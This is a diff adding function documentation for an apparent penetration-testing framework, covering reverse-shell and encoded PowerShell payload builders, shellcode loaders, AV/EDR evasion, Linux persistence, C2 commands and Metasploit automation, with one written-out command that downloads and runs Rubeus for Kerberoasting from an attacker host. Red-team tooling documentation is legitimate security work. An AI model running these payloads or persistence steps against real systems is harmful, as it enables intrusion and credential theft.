@@ -197,7 +197,14 @@ or alias is not found, it prints an error message.</p>
 <h2 id="logcsv">logcsv</h2>
 <p>No description available.</p>
 <h2 id="cmd">cmd</h2>
-<p>No description available.</p>
+<p>Internal function to execute commands.</p>
+<p>This method attempts to execute a given command using
+<code>os.system</code> and captures the output. It sets the
+<code>output</code> attribute based on whether the command was executed
+successfully or an exception occurred. And feedback the red operation
+report.</p>
+<p>:param command: The command to be executed. :type command: str
+:return: None. :rtype: str</p>
 <h2 id="one_cmd">one_cmd</h2>
 <p>Internal function to execute commands.</p>
 <p>This method attempts to execute a given command using
@@ -591,7 +598,7 @@ The script <code>modules/lazyhoneypot.py</code> should be present in the
 appropriate permissions and dependencies to run. - Ensure that the email
 credentials are correctly set for successful authentication and
 operation.</p>
-<h2 id="lazygptcli">lazygptcli</h2>
+<h2 id="gpt">gpt</h2>
 <p>Run the internal module to create Oneliners with Groq AI located at
 <code>modules/lazygptcli.py</code> with the specified parameters.</p>
 <p>This function executes the script with the following arguments:</p>
@@ -1548,6 +1555,22 @@ syntax: sudo impacket-GetNPUsers <domain> -no-pass -usersfile
 sessions/users.txt Replace <code>&lt;domain&gt;</code> with the actual
 domain name you want to query.</p>
 <h2 id="psexec">psexec</h2>
+<p>Executes the Impacket PSExec tool to attempt remote execution on the
+specified target.</p>
+<p>This function performs the following actions: 1. Checks if the
+provided target host (<code>rhost</code>) is valid. 2. If the
+<code>line</code> argument is “pass”, it searches for credential files
+with the pattern <code>credentials*.txt</code> and allows the user to
+select which file to use for executing the command. 3. If the
+<code>line</code> argument is not “pass”, it assumes execution without a
+password (using the current credentials). 4. Copies the
+<code>rhost</code> IP address to the clipboard for ease of use.</p>
+<p>Parameters: line (str): A command argument to determine the action.
+If “pass”, the function searches for credential files and authenticates
+using the selected file. Otherwise, it executes PSExec without a
+password using the <code>rhost</code> IP.</p>
+<p>Returns: None</p>
+<h2 id="psexec_py">psexec_py</h2>
 <p>Executes the Impacket PSExec tool to attempt remote execution on the
 specified target.</p>
 <p>This function performs the following actions: 1. Checks if the
@@ -2787,7 +2810,424 @@ clipboard using <code>xclip</code>.</p>
 included for consistency with other command methods. :type line: str
 :returns: None</p>
 <p>Manual execution: 1. The command
-<code>echo -e "[\e[96m\</code>pwd`<code>is retrieved and used to construct the</code>skipfish<code>command. 5. If the URL is not configured and an attempt is made to use the 'url' option, an error message is printed, and the function exits. 6. The constructed</code>skipfish<code>command is displayed on the console and executed using</code>os.system`.</p>
+<code>echo -e "[\e[96m\</code>pwd`</p>
+<h2 id="winbase64payload">winbase64payload</h2>
+<p>Creates a base64 encoded payload specifically for Windows to execute
+a PowerShell command or download a file using <code>lhost</code>.</p>
+<ol type="1">
+<li>Checks if <code>lhost</code> is set:
+<ul>
+<li>Displays an error message and exits if <code>lhost</code> is not
+set.</li>
+</ul></li>
+<li>Checks if a file name or command is provided:
+<ul>
+<li>Displays an error message and exits if no file name or command is
+provided.</li>
+</ul></li>
+<li>Prompts for the type of payload:
+<ul>
+<li>‘1’: Constructs a PowerShell command to download and execute a
+<code>.ps1</code> script from <code>lhost</code>.</li>
+<li>‘2’: Constructs a command to download a file using
+<code>wget</code>.</li>
+</ul></li>
+<li>Prompts for the output type:
+<ul>
+<li>‘1’: Outputs the base64 encoded PowerShell command.</li>
+<li>‘2’: Outputs the base64 encoded command in an ASP format.</li>
+<li>‘3’: Outputs the base64 encoded command in a PHP format.</li>
+</ul></li>
+<li>Encodes the command:
+<ul>
+<li>Converts the command to UTF-16LE encoding.</li>
+<li>Encodes the UTF-16LE encoded command to base64.</li>
+<li>Copies the final base64 command to the clipboard using
+<code>copy2clip</code>.</li>
+</ul></li>
+</ol>
+<p>:param line: The name of the <code>.ps1</code> file or the command to
+be executed. :type line: str :returns: None</p>
+<p>Manual execution: To manually use the payload: - Ensure
+<code>lhost</code> is assign to the correct IP address. - Place the
+<code>.ps1</code> file in the <code>sessions</code> directory if using
+the ‘ps1’ payload type. - Use <code>copy2clip</code> to copy the
+generated base64 command to the clipboard.</p>
+<p>Note: Ensure <code>iconv</code>, <code>base64</code>, and
+<code>xclip</code> are installed and available on your system.</p>
+<h2 id="revwin">revwin</h2>
+<p>Creates a base64 encoded PowerShell reverse shell payload
+specifically for Windows to execute a <code>.ps1</code> script from
+<code>lhost</code>.</p>
+<ol type="1">
+<li>Checks if <code>lhost</code> and <code>lport</code> are assign and
+valid:
+<ul>
+<li>Uses <code>check_lhost(lhost)</code> to verify the
+<code>lhost</code> parameter.</li>
+<li>Uses <code>check_lport(lport)</code> to verify the
+<code>lport</code> parameter.</li>
+<li>Exits the function if either <code>lhost</code> or
+<code>lport</code> is invalid.</li>
+</ul></li>
+<li>Constructs a PowerShell reverse shell command with the following
+structure:
+<ul>
+<li>Connects to the specified <code>lhost</code> and <code>lport</code>
+using <code>TCPClient</code>.</li>
+<li>Reads data from the TCP stream, executes it, and sends back the
+results.</li>
+<li>Appends the current path to the response for interactive use.</li>
+</ul></li>
+<li>Encodes the PowerShell command:
+<ul>
+<li>Encodes the command in UTF-16LE.</li>
+<li>Converts the UTF-16LE encoded command to base64.</li>
+<li>Creates a PowerShell command that executes the base64 encoded
+payload.</li>
+</ul></li>
+<li>Copies the final PowerShell command to the clipboard:
+<ul>
+<li>Uses <code>xclip</code> to copy the command to the clipboard.</li>
+</ul></li>
+</ol>
+<p>:param line: This parameter is not used in the function but is
+present for consistency with the method signature. :type line: str
+:returns: None</p>
+<p>Manual execution: To manually use the payload: - Ensure
+<code>lhost</code> and <code>lport</code> are correctly set. - Use
+<code>xclip</code> to copy the generated PowerShell command to the
+clipboard.</p>
+<p>Note: Ensure <code>xclip</code> is installed and available on your
+system.</p>
+<h2 id="asprevbase64">asprevbase64</h2>
+<p>Creates a base64 encoded ASP reverse shell payload and copies it to
+the clipboard.</p>
+<ol type="1">
+<li>Checks if a base64 encoded payload is provided:
+<ul>
+<li>If no payload is provided, displays an error message and exits the
+function.</li>
+</ul></li>
+<li>If a payload is provided:
+<ul>
+<li>Creates an ASP script that uses <code>WScript.Shell</code> to
+execute a PowerShell command encoded in base64.</li>
+<li>The created ASP script writes the result of the PowerShell command
+to the response output.</li>
+<li>Uses <code>xclip</code> to copy the ASP script to the clipboard with
+the provided base64 encoded payload.</li>
+</ul></li>
+</ol>
+<p>:param line: The base64 encoded payload to be used in the ASP reverse
+shell. :type line: str :returns: None</p>
+<p>Manual execution: To manually create the ASP payload: - Ensure you
+have the base64 encoded payload ready. - Use <code>xclip</code> to copy
+the provided command to the clipboard.</p>
+<p>Note: Ensure <code>xclip</code> is installed and available on your
+system. For help on creating the base64 encoded payload, see
+<code>help winbase64payload</code>.</p>
+<h2 id="rubeus">rubeus</h2>
+<p>Copies a command to the clipboard for downloading and running
+Rubeus.</p>
+<ol type="1">
+<li>Checks if <code>lhost</code> (local host IP) is set:
+<ul>
+<li>If <code>lhost</code> is not set, displays an error message and
+exits the function.</li>
+</ul></li>
+<li>If <code>lhost</code> is set:
+<ul>
+<li>Displays a message indicating that the Rubeus downloader command has
+been copied to the clipboard.</li>
+<li>The copied command downloads Rubeus from the specified
+<code>lhost</code> and saves it as <code>Rubeus.exe</code>.</li>
+<li>Uses <code>xclip</code> to copy the following command to the
+clipboard:</li>
+<li><code>iwr -uri http://{lhost}/Rubeus.exe -OutFile Rubeus.exe ; .\Rubeus.exe kerberoast /creduser:domain.local\usuario /credpassword:password</code></li>
+</ul></li>
+</ol>
+<p>:param line: Not used in this function. :type line: str :returns:
+None</p>
+<p>Manual execution: To manually run these tasks, you would need to: -
+Ensure that <code>lhost</code> is assign correctly. - Use
+<code>xclip</code> to copy the provided command to the clipboard. -
+Execute the downloaded Rubeus executable with the provided
+arguments.</p>
+<p>Note: Ensure <code>xclip</code> is installed and available on your
+system.</p>
+<h2 id="socat">socat</h2>
+<p>Sets up and runs a <code>socat</code> tunnel with SOCKS4A proxy
+support.</p>
+<ol type="1">
+<li><p>If no <code>line</code> (IP:port) argument is provided:</p>
+<ul>
+<li>Displays an error message indicating the need to pass
+<code>ip:port</code>.</li>
+<li>Exits the function.</li>
+</ul></li>
+<li><p>Displays a message instructing the user to configure
+<code>socks5</code> at <code>127.0.0.1:1080</code> in
+<code>/etc/proxychains.conf</code>.</p></li>
+<li><p>If a valid <code>line</code> argument is provided:</p>
+<ul>
+<li>Displays the command being run:
+<code>socat TCP-LISTEN:1080,fork SOCKS4A:localhost:{line},socksport=1080</code>.</li>
+<li>Executes the <code>socat</code> command to listen on port 1080 and
+forward traffic to the specified IP and port using SOCKS4A proxy.</li>
+<li>Prints a shutdown message for the <code>socat</code> tunnel at port
+1080.</li>
+</ul></li>
+</ol>
+<p>:param line: The IP and port (formatted as <code>ip:port</code>) to
+forward traffic to through the SOCKS4A proxy. :type line: str :returns:
+None</p>
+<p>Manual execution: To manually run these tasks, you would need to: -
+Configure the <code>socks5</code> proxy settings in
+<code>/etc/proxychains.conf</code>. - Use the <code>socat</code> command
+with appropriate IP and port.</p>
+<p>Note: Ensure that <code>socat</code> is installed and properly
+configured on your system.</p>
+<h2 id="chisel">chisel</h2>
+<p>Automates the setup and execution of Chisel server and client for
+tunneling and port forwarding.</p>
+<ol type="1">
+<li>If no <code>lhost</code> (local host IP) is assign:
+<ul>
+<li>Displays an error message indicating the need to assign
+<code>lhost</code> using the <code>set</code> command.</li>
+<li>Exits the function.</li>
+</ul></li>
+<li>If no port argument is provided:
+<ul>
+<li>Displays an error message indicating the need to provide a port
+number.</li>
+<li>Exits the function.</li>
+</ul></li>
+<li>If required Chisel files are not present:
+<ul>
+<li>Displays an error message prompting the user to run the
+<code>download_resources</code> command.</li>
+<li>Exits the function.</li>
+</ul></li>
+<li>If a valid port is provided:
+<ul>
+<li>Displays usage instructions for the Linux and Windows payloads.</li>
+<li>Constructs and copies the appropriate Chisel command to the
+clipboard based on user choice (1 for Windows, 2 for Linux).</li>
+<li>Extracts and sets up Chisel binaries for Linux and Windows from
+compressed files.</li>
+<li>Runs the Chisel server on the specified port and prints a shutdown
+message.</li>
+</ul></li>
+</ol>
+<p>:param line: The command line input containing the port number for
+Chisel setup. :type line: str :returns: None</p>
+<p>Manual execution: To manually run these tasks, you would need to: -
+Ensure <code>lhost</code> is assign using
+<code>assign lhost &lt;IP&gt;</code>. - Provide the port number when
+calling the function. - Run the command <code>download_resources</code>
+if the Chisel files are missing. - Manually execute the Chisel commands
+for Linux or Windows as copied to the clipboard.</p>
+<p>Note: Ensure that all required files
+(<code>chisel_1.9.1_linux_amd64.gz</code> and
+<code>chisel_1.9.1_windows_amd64.gz</code>) are available in the
+<code>sessions</code> directory.</p>
+<h2 id="msf">msf</h2>
+<p>Automates various Metasploit tasks including scanning for
+vulnerabilities, setting up reverse shells, and creating payloads.</p>
+<ol type="1">
+<li>If no arguments are provided:
+<ul>
+<li>Retrieves the target IP (<code>rhost</code>) from parameters.</li>
+<li>Checks if the IP is valid using <code>check_rhost()</code>. If
+invalid, exits the function.</li>
+<li>Creates a Metasploit resource script
+(<code>/tmp/scan_vulnerabilities.rc</code>) that includes commands for
+scanning ports, enumerating services, and checking for known
+vulnerabilities.</li>
+<li>Executes Metasploit with the created resource script and then
+deletes the temporary file.</li>
+<li>Prints a shutdown message after running the scan.</li>
+</ul></li>
+<li>If the argument starts with “rev”:
+<ul>
+<li>Sets up a reverse shell payload based on the specified platform and
+user choice (with or without meterpreter).</li>
+<li>Creates a Metasploit resource script (<code>/tmp/handler.rc</code>)
+for handling incoming reverse shell connections.</li>
+<li>Executes Metasploit with the created resource script and then
+deletes the temporary file.</li>
+<li>Prints a shutdown message after setting up the handler.</li>
+</ul></li>
+<li>If the argument starts with “lnk”:
+<ul>
+<li>Configures parameters (<code>lhost</code>, <code>lport</code>) for
+creating a payload.</li>
+<li>Uses <code>msfvenom</code> to generate a payload executable and
+saves it in the <code>sessions</code> directory.</li>
+<li>Creates an XML file (<code>download_payload.xml</code>) that will be
+used to download and execute the payload on a target machine.</li>
+<li>Creates a PowerShell script (<code>create_lnk.ps1</code>) to
+generate a shortcut file (<code>.lnk</code>) pointing to the
+payload.</li>
+<li>Prints instructions and generates a command to copy to the clipboard
+for setting up the payload and files.</li>
+</ul></li>
+<li>If the argument starts with “autoroute”:
+<ul>
+<li>Configures parameters for setting up a Metasploit session and
+autorouting.</li>
+<li>Creates a Metasploit resource script
+(<code>/tmp/autoroute.rc</code>) to handle exploit sessions and assign
+up autorouting.</li>
+<li>Executes Metasploit with the resource script and starts a SOCKS
+proxy for routing traffic.</li>
+<li>Configures proxychains to use the Metasploit SOCKS proxy and prints
+instructions for using proxychains with tools.</li>
+</ul></li>
+</ol>
+<p>:param line: The command line input that determines which Metasploit
+task to automate. :type line: str :returns: None</p>
+<p>Manual execution: To manually run these tasks, you would need to: -
+For scanning: Create and run the resource script using
+<code>msfconsole -r /tmp/scan_vulnerabilities.rc</code>. - For reverse
+shells: Configure and run the resource script with the appropriate
+payload settings. - For payload generation and shortcuts: Use
+<code>msfvenom</code> and create XML and PowerShell scripts as
+specified. - For autorouting: Create and run the resource script for
+autorouting and configure proxychains.</p>
+<p>Note: Ensure all required parameters (<code>lhost</code>,
+<code>lport</code>, etc.) are assign before running these tasks.</p>
+<h2 id="encrypt">encrypt</h2>
+<p>Encrypts a file using XOR encryption.</p>
+<ol type="1">
+<li>Splits the provided <code>line</code> into <code>file_path</code>
+and <code>key</code> arguments.</li>
+<li>Checks if the correct number of arguments (2) is provided; if not,
+prints an error message and returns.</li>
+<li>Reads the file specified by <code>file_path</code>.</li>
+<li>Encrypts the file contents using the
+<code>xor_encrypt_decrypt</code> function with the provided
+<code>key</code>.</li>
+<li>Writes the encrypted data to a new file with the “.enc” extension
+added to the original file name.</li>
+<li>Prints a message indicating the file has been encrypted.</li>
+<li>Catches and handles the <code>FileNotFoundError</code> exception if
+the specified file does not exist, and prints an error message.</li>
+</ol>
+<p>:param line: A string containing the file path and the key separated
+by a space. :type line: str :returns: None</p>
+<p>Manual execution: To manually run this command, use the following
+syntax: encrypt <file_path> <key> Replace <code>&lt;file_path&gt;</code>
+with the path to the file to be encrypted and <code>&lt;key&gt;</code>
+with the encryption key.</p>
+<h2 id="decrypt">decrypt</h2>
+<p>Decrypts a file using XOR encryption.</p>
+<ol type="1">
+<li>Splits the provided <code>line</code> into <code>file_path</code>
+and <code>key</code> arguments.</li>
+<li>Checks if the correct number of arguments (2) is provided; if not,
+prints an error message and returns.</li>
+<li>Reads the encrypted file specified by <code>file_path</code>.</li>
+<li>Decrypts the file contents using the
+<code>xor_encrypt_decrypt</code> function with the provided
+<code>key</code>.</li>
+<li>Writes the decrypted data to a new file by removing the “.enc”
+extension from the original file name.</li>
+<li>Prints a message indicating the file has been decrypted.</li>
+<li>Catches and handles the <code>FileNotFoundError</code> exception if
+the specified file does not exist, and prints an error message.</li>
+</ol>
+<p>:param line: A string containing the file path and the key separated
+by a space. :type line: str :returns: None</p>
+<p>Manual execution: To manually run this command, use the following
+syntax: decrypt <file_path> <key> Replace <code>&lt;file_path&gt;</code>
+with the path to the encrypted file and <code>&lt;key&gt;</code> with
+the decryption key.</p>
+<h2 id="get_output">get_output</h2>
+<p>Devuelve la salida acumulada</p>
+<h2 id="sessionssh">sessionssh</h2>
+<p>Ejecuta un comando para listar las conexiones SSH activas.</p>
+<p>Este método utiliza <code>netstat</code> para mostrar las conexiones
+establecidas (<code>ESTAB</code>) y filtra los resultados para mostrar
+solo las conexiones SSH.</p>
+<p>Parámetros: - line: Parámetro no utilizado en esta función.</p>
+<p>Returns: - None</p>
+<p>Ejemplos: &gt;&gt;&gt; do_sessionssh(““) (Muestra en consola las
+conexiones SSH activas)</p>
+<h2 id="sessionsshstrace">sessionsshstrace</h2>
+<p>Attach strace to a running process and log output to a file.</p>
+<p>This function attaches <code>strace</code> to a process specified by
+its PID, tracing system calls related to writing data. The output of
+<code>strace</code> is saved to a file named <code>strace.txt</code> in
+the <code>sessions</code> directory.</p>
+<p>Parameters: - line (str): The PID of the process to attach strace
+to.</p>
+<p>Raises: - ValueError: If the <code>line</code> parameter is empty. -
+FileNotFoundError: If <code>strace</code> is not installed.</p>
+<p>Example: - <code>sessionsshstrace 666</code>: Attach strace to
+process with PID 666.</p>
+<p>Notes: - Ensure the <code>sessions</code> directory exists or is
+created before running the command. - The command redirects both stdout
+and stderr to the <code>strace.txt</code> file.</p>
+<h2 id="lazyscript">lazyscript</h2>
+<p>Executes commands defined in a lazyscript file.</p>
+<p>This function reads a script file containing commands to be executed
+sequentially. Each command is executed using the onecmd method of the
+cmd.Cmd class. The script file should be located in the ‘lazyscripts’
+directory relative to the current working directory.</p>
+<p>Args: line (str): The name of the script file to execute (e.g.,
+‘lazyscript.ls’).</p>
+<p>Example: do_lazyscript(‘example_script.ls’) This would execute all
+commands listed in ‘lazyscripts/example_script.ls’.</p>
+<h2 id="set_proxychains">set_proxychains</h2>
+<p>Relanza la aplicación actual utilizando <code>proxychains</code> para
+enrutar el tráfico a través de los proxies configurados.</p>
+<p>Este comando reinicia la aplicación desde el principio utilizando un
+script bash externo llamado <code>run</code>, que se encarga de
+configurar el entorno (como activar un entorno virtual) y luego ejecutar
+la aplicación Python. El comando <code>proxychains</code> se utiliza
+para asegurar que cualquier comando ejecutado dentro de la aplicación,
+como <code>nmap</code>, sea encaminado a través de los proxies
+especificados en la configuración de <code>proxychains</code>.</p>
+<p>Pasos realizados por esta función: 1. Obtiene la ruta al script
+<code>run</code>. 2. Relanza el script <code>run</code> bajo
+<code>proxychains</code> utilizando <code>subprocess.run</code>. 3. Sale
+de la instancia actual de la aplicación para evitar duplicación.</p>
+<p>Args: line (str): No se utiliza en este comando, pero se incluye como
+parte de la interfaz estándar de <code>cmd</code>.</p>
+<h2 id="shellcode">shellcode</h2>
+<p>Generates a Python one-liner to execute shellcode from a given
+URL.</p>
+<p>This function: 1. Retrieves the local host (lhost) from the
+parameters. 2. Checks if the local host is valid. 3. Verifies the
+existence of the <code>shellcode.bin</code> file in the expected
+directory. 4. Constructs a Python one-liner command that: - Fetches the
+shellcode from the specified URL. - Decodes the base64-encoded
+shellcode. - Creates a buffer in memory for the shellcode. - Casts the
+buffer to a function pointer. - Executes the shellcode. 5. Copies the
+generated command to the clipboard for easy execution.</p>
+<h2 id="skipfish">skipfish</h2>
+<p>This function executes the web security scanning tool Skipfish using
+the provided configuration and parameters. It allows scanning a
+specified target (rhost) and saves the results in a designated output
+directory.</p>
+<p>Parameters: - self: Refers to the instance of the class in which this
+function is defined. - line: A string that may contain additional
+options to modify the scanning behavior.</p>
+<p>Function Flow: 1. Default values are set for the target IP (rhost),
+port (port), and output directory (outputdir). 2. The validity of the
+target (rhost) is checked using the <code>check_rhost</code> function.
+3. If no argument is provided in <code>line</code>, a
+<code>skipfish</code> command is constructed using the default values.
+4. If <code>line</code> starts with ‘url’, the URL configured in
+<code>self.params['url']</code> is retrieved and used to construct the
+<code>skipfish</code> command. 5. If the URL is not configured and an
+attempt is made to use the ‘url’ option, an error message is printed,
+and the function exits. 6. The constructed <code>skipfish</code> command
+is displayed on the console and executed using
+<code>os.system</code>.</p>
 <p>Note: - The function assumes that the <code>skipfish</code> tool is
 installed on the system. - The output of the scan is saved in the
 directory <code>sessions/{rhost}/skipfish/</code>. - The wordlist used
@@ -2973,7 +3413,7 @@ shutting down the server.</p>
 server.</p>
 <p>Returns: None</p>
 <p>Raises: None</p>
-<p>Example: c2 victim-1</p>
+<p>Example: c2 victim 1</p>
 <p>Notes: - Ensure that the <code>lhost</code> and <code>lport</code>
 parameters are valid before calling this function. - The
 <code>modules/run</code> file must exist and be correctly formatted. -
@@ -3573,8 +4013,24 @@ use.</p>
 <h2 id="netexec">netexec</h2>
 <p>Executes netexec with various options for network protocol
 operations.</p>
-<p>:param line: Not used directly but reserved for future use.</p>
-<p>:returns: None</p>
+<p>This function handles the installation of netexec and allows the user
+to execute various network protocol operations with minimal input. It
+reads credentials from a specified file and constructs the necessary
+commands to interact with the target system.</p>
+<p>:param line: Command line input from the user. This input is used to
+determine the protocol and action to be executed. :returns: None</p>
+<p>The function performs the following steps: 1. Checks if netexec is
+installed. If not, it installs it. 2. Reads credentials from a file. 3.
+Constructs and executes the netexec command based on user input. 4.
+Enumerates available protocols and actions for each protocol, allowing
+the user to select them interactively. 5. Enumerates available options
+for each action, allowing the user to select them interactively.</p>
+<p>Example usage:</p>
+<pre><code>do_netexec(&quot;smb target -u username -p password --shares&quot;)</code></pre>
+<p>This will execute the SMB protocol with the specified action and
+options.</p>
+<p>If no specific command is provided, the function will prompt the user
+to select a protocol and action interactively.</p>
 <h2 id="scarecrow">scarecrow</h2>
 <p>Executes ScareCrow with various options for bypassing EDR solutions
 and executing shellcode. to create the shellcode.bin you need run venom
@@ -3936,7 +4392,30 @@ directory.</p>
 <p>This function starts a <code>nc</code> listener on the specified
 local port. It can use a port defined in the <code>lport</code>
 parameter or a port provided as an argument.</p>
-<p>Usage: pwncatcs <port></p>
+<p>Usage: nc <port></p>
+<p>:param line: The port number to use for the <code>nc</code> listener.
+If not provided, it defaults to the <code>lport</code> parameter. :type
+line: str :returns: None</p>
+<p>Manual execution: 1. Ensure that <code>nc</code> is installed and
+accessible from your command line. 2. The port number can either be
+provided as an argument or be set in the <code>lport</code> parameter of
+the function. 3. Run the function to start <code>nc</code> on the
+specified port.</p>
+<p>If no port is provided as an argument, the function will use the port
+specified in the <code>lport</code> parameter. If a port is provided, it
+overrides the <code>lport</code> value.</p>
+<p>After starting the listener, the function prints a message indicating
+that <code>nc</code> is running on the specified port and another
+message when the session is closed.</p>
+<p>Dependencies: - <code>nc</code>: A tool used for creating reverse
+shells or bind shells.</p>
+<h2 id="rnc">rnc</h2>
+<p>Runs <code>nc</code> with rlwrap the specified port for
+listening.</p>
+<p>This function starts a <code>nc</code> listener with rlwrap on the
+specified local port. It can use a port defined in the
+<code>lport</code> parameter or a port provided as an argument.</p>
+<p>Usage: rnc <port></p>
 <p>:param line: The port number to use for the <code>nc</code> listener.
 If not provided, it defaults to the <code>lport</code> parameter. :type
 line: str :returns: None</p>
@@ -5676,6 +6155,15 @@ and <code>git</code> to be installed. - Uses parameters from
 <p>Usage: dploot <action> -d <domain> -u <username> -p <password> -t
 <target> dploot <action> -k -d <domain> -t <target></p>
 <h2 id="banners">banners</h2>
+<p>Extract and display banners from XML files in the ‘sessions’
+directory.</p>
+<p>This function searches for XML files in the ‘sessions’ directory and
+extracts banner information from each file. The banner information
+includes the hostname, port, protocol, extra details, and service. If no
+XML files are found, an error message is displayed.</p>
+<p>Args: line (str): Not used in this function.</p>
+<p>Returns: None</p>
+<p>Example: banners</p>
 <h2 id="createpayload">createpayload</h2>
 <p>Generates an obfuscated payload to evade AV detection using the
 payloadGenerator tool. thanks to smokeme</p>
@@ -5696,7 +6184,363 @@ result in the terminal and saves it to a file.</p>
 parameters. - Uses default values if parameters are not provided. - Uses
 parameters from <code>self.params</code> for filename, width, quotes,
 and format.</p>
-<p>Usage: bin2shellcode [<filename> [<width> [<quotes> [<format>]]]]</p>
+<p>Usage: bin2shellcode [<filename> [<width> [<quotes> [<format>]]]]
+bin2shellcode sessions/shellcode.bin 20 True c</p>
+<h2 id="news">news</h2>
+<p>Show the Hacker News in the terminal.</p>
+<p>Parameters: line (str): optional Return None</p>
+<h2 id="vulns">vulns</h2>
+<p>Scan for vulnerabilities based on a provided service banner.</p>
+<p>This function initializes a vulnerability scanner and searches for
+CVEs (Common Vulnerabilities and Exposures) related to the specified
+service banner. If no service banner is provided, it prompts the user to
+enter one.</p>
+<p>Args: line (str): The service banner to search for vulnerabilities.
+If not provided, the user will be prompted to enter one.</p>
+<p>Returns: None</p>
+<p>Example: do_vulns “ProFTPD 1.3.5”</p>
+<h2 id="exe2bin">exe2bin</h2>
+<p>Trasnform file .exe into binary file.</p>
+<p>Args: line (str): Ruta del archivo ejecutable .exe.</p>
+<p>Return shellcode.bin file in sessions directory</p>
+<h2 id="atomic_lazyown">atomic_lazyown</h2>
+<p>Genera y ejecuta pruebas de Atomic Red Team usando el C2.</p>
+<p>Parameters: line (str): Lista de IDs de técnicas separadas por
+espacios.</p>
+<p>Returns: None</p>
+<h2 id="upload_file_to_c2">upload_file_to_c2</h2>
+<p>Sube un archivo al C2.</p>
+<p>Parameters: file_path (str): Ruta del archivo a subir.</p>
+<p>Returns: None</p>
+<h2 id="download_file_from_c2">download_file_from_c2</h2>
+<p>Descarga un archivo desde el C2.</p>
+<p>Parameters: file_name (str): Nombre del archivo a descargar. clientid
+(str): Identificador del cliente (opcional).</p>
+<p>Returns: None</p>
+<h2 id="issue_command_to_c2">issue_command_to_c2</h2>
+<p>Ejecuta un comando en el cliente usando el C2.</p>
+<p>Parameters: command (str): Comando a ejecutar.</p>
+<p>Returns: None</p>
+<h2 id="ofuscatorps1">ofuscatorps1</h2>
+<p>Obfuscates a PowerShell script using various techniques. by <span
+class="citation" data-cites="JoelGMSec">@JoelGMSec</span>
+https://github.com/JoelGMSec/Invoke-Stealth/ rewite in python by grisun0
+This function: - Displays a banner and help information if requested. -
+Validates the provided parameters. - Executes all obfuscation techniques
+on the input PowerShell script by default. - Displays the result in the
+terminal.</p>
+<p>Behavior: - Requires <code>python3</code> to be installed for certain
+techniques. - Uses parameters from the command line for the script path
+and optional flags.</p>
+<p>Usage: ofuscatorps1 <script_path> [-nobanner]</p>
+<p>Techniques: - Chameleon: Substitute strings and concatenate
+variables. - BetterXencrypt: Compresses and encrypts with random
+iterations. - PyFuscation: Obfuscate functions, variables, and
+parameters. - ReverseB64: Encode with base64 and reverse it to avoid
+detections. - PSObfuscation: Convert content to bytes and compress with
+Gzip. - All: Sequentially executes all techniques described above.</p>
+<h2 id="d3monizedshell">d3monizedshell</h2>
+<p>Executes the D3m0n1z3dShell tool for persistence in Linux.</p>
+<p>This function: - Installs D3m0n1z3dShell if not already installed. -
+Executes the D3m0n1z3dShell command with the provided parameters. -
+Displays the result in the terminal.</p>
+<p>Behavior: - Requires <code>git</code> and <code>curl</code> to be
+installed. - Uses a one-liner installation method for simplicity.</p>
+<p>Usage: d3monizedshell</p>
+<h2 id="scp">scp</h2>
+<p>Copies the local “sessions” directory to a remote host using scp,
+leveraging sshpass for automated authentication.</p>
+<p>Steps: 1. Verifies if the credentials file exists in the “sessions”
+directory. If not, prompts the user for a username and password. 2.
+Reads the credentials file if it exists and extracts the username and
+password. 3. Constructs an scp command to deploy the “sessions”
+directory to the remote host. 4. Executes the scp command using the
+system shell.</p>
+<p>Args: line (str): Input command line (optional). The third parameter
+can be ‘win’ or ‘lin’ to specify the target OS.</p>
+<p>Dependencies: - The <code>sshpass</code> command-line tool must be
+installed on the local machine. - <code>scp</code> must be installed on
+both the local and remote machines. - The remote host must be accessible
+via SSH.</p>
+<p>Attributes: - <code>self.params</code>: Dictionary containing the
+following keys: - <code>username</code> (str, optional): Predefined
+username. Defaults to prompting the user if not provided. -
+<code>password</code> (str, optional): Predefined password. Defaults to
+prompting the user if not provided. - <code>rhost</code> (str): Remote
+host’s IP or domain name.</p>
+<p>Raises: - KeyError: If <code>rhost</code> is not provided in
+<code>self.params</code>. - FileNotFoundError: If the “sessions”
+directory does not exist.</p>
+<p>Note: - The <code>credentials.txt</code> file, if present, should
+have credentials in the format <code>username:password</code> on the
+first line.</p>
+<p>Returns: None</p>
+<h2 id="apt_proxy">apt_proxy</h2>
+<p>Configures the local machine with internet access to act as an APT
+proxy for a machine without internet access.</p>
+<p>Steps: 1. Installs and configures apt-cacher-ng on the local machine.
+2. Generates the necessary commands to configure the remote machine to
+use the proxy. 3. Copies the commands to the clipboard using the
+copy2clip function.</p>
+<p>Parameters: line (str): The IP address of the remote machine without
+internet access.</p>
+<p>Returns: None</p>
+<h2 id="pip_proxy">pip_proxy</h2>
+<p>Configures the local machine with internet access to act as a pip
+proxy for a machine without internet access.</p>
+<p>Steps: 1. Installs and configures squid on the local machine. 2.
+Generates the necessary commands to configure the remote machine to use
+the proxy. 3. Copies the commands to the clipboard using the copy2clip
+function.</p>
+<p>Parameters: line (str): The IP address of the remote machine without
+internet access.</p>
+<p>Returns: None</p>
+<h2 id="internet_proxy">internet_proxy</h2>
+<p>Configures the local machine with internet access to act as a proxy
+for a machine without internet access.</p>
+<p>Steps: 1. Installs and configures squid on the local machine. 2.
+Generates the necessary commands to configure the remote machine to use
+the proxy. 3. Copies the commands to the clipboard using the copy2clip
+function.</p>
+<p>Parameters: line (str): The IP address of the remote machine without
+internet access.</p>
+<p>Returns: None</p>
+<h2 id="check_update">check_update</h2>
+<p>Checks for updates by comparing the local version with the remote
+version.</p>
+<p>This function: - Fetches the remote version from a JSON file hosted
+on GitHub. - Reads the local version from a JSON file in the script’s
+root directory. - Compares the version numbers and determines if an
+update is needed.</p>
+<p>Behavior: - Requires <code>requests</code> library to fetch the
+remote version. - Uses JSON parsing to extract version numbers.</p>
+<p>Usage: check_update</p>
+<h2 id="wmiexecpro">wmiexecpro</h2>
+<p>Executes wmiexec-pro with various options for WMI operations.</p>
+<p>This function handles the installation of wmiexec-pro and its
+dependencies, and allows the user to execute various WMI operations with
+minimal input. It reads credentials from a specified file and constructs
+the necessary commands to interact with the target system.</p>
+<p>:param line: Command line input from the user. This input is used to
+determine the module and action to be executed. :returns: None</p>
+<p>The function performs the following steps: 1. Checks if wmiexec-pro
+and its dependencies are installed. If not, it installs them in
+specified directories. 2. Reads credentials from a file. 3. Constructs
+and executes the wmiexec-pro command based on user input. 4. Enumerates
+available modules and actions for each module, allowing the user to
+select them interactively. 5. Enumerates available options for each
+action, allowing the user to select them interactively.</p>
+<p>Example usage:</p>
+<pre><code>do_wmiexecpro(&quot;enum -run&quot;)</code></pre>
